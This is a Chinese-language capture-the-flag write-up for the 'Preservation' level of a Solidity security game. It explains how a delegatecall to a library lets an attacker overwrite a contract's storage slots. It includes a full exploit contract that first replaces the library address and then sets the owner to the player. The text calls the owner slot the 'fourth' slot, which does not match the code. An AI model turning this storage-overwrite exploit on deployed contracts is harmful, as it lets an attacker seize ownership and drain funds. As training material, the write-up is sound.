# 第十六关：Preservation

### 本关知识点：
```
1. delegatecall调用
2. 合约变量的存储
3. uint256和address的类型转换
```

## 1. 题目要求
` 尝试取得合约的所有权（`owner`）。`

## 2. 代码功能解读

![[2023-05-21_201052.png]]

## 3. 漏洞分析
```
通过delegatecall更改调用者合约的参数。
	1. uint的大小是256位，address的大小是160位，我们把address伪装为uint，然后传入setFirstTime方法，将timeZone1Library变量设置为自己的地址。
	2. 在攻击合约中将"setTime(uint256)"方法设置为修改第四个槽位的值为玩家的地址。
```

## 4. 攻击方法
``` java
contract Exploit {

  Preservation pres;

  address solt1;

  address solt2;

  // uint256 solt3;

  constructor(address addr) {

    pres = Preservation(addr);

  }

  

  function attack()public {

    uint256 time = uint256(uint160(address(this)));

    pres.setFirstTime(time);

    require(pres.timeZone1Library() == address(this), "error attack");

    uint256 owner = uint256(uint160(address(msg.sender)));

    pres.setFirstTime(owner);

    require(pres.owner() == msg.sender, "error owner");

  }

    function setTime(uint _player) public {

    solt2 = address(uint160(_player));

  }

}
```

## 5. 攻击调用图
![[Pasted image 20230521204944.png]]
![[Pasted image 20230521205124.png]]


## 6. 知识点分析


如果对大家有用，请点赞；如果喜欢，请订阅加点赞，会一直更新~